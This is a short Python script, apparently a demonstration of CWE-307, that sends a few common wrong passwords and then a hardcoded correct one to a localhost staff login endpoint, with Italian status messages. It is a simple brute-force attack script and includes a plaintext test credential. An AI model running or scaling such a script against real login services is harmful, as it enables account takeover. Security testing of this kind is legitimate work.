import requests
import time

URL = "http://localhost:5000/api/v1/staff/auth"
USERNAME = "m.rossi@tomorrowland.com"
CORRECT_PASSWORD = "cashless2026"

wrong_passwords = ["password123", "admin", "qwerty", "123456", "password", "test"]

print("[*] Inizio attacco Brute Force (Simulazione CWE-307)...")

for pwd in wrong_passwords:
    payload = {"username": USERNAME, "password": pwd}
    try:
        response = requests.post(URL, json=payload)
        print(f"[-] Tentativo fallito con password: {pwd} | Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Errore di connessione: {e}")
    time.sleep(0.1)

print("\n[*] Invio payload con password corretta...")
payload = {"username": USERNAME, "password": CORRECT_PASSWORD}
try:
    response = requests.post(URL, json=payload)
    print(f"[+] Login effettuato con successo! Status: {response.status_code}")
    print(f"[+] Risposta del server: {response.json()}")
except requests.exceptions.RequestException as e:
    print(f"[!] Errore di connessione: {e}")
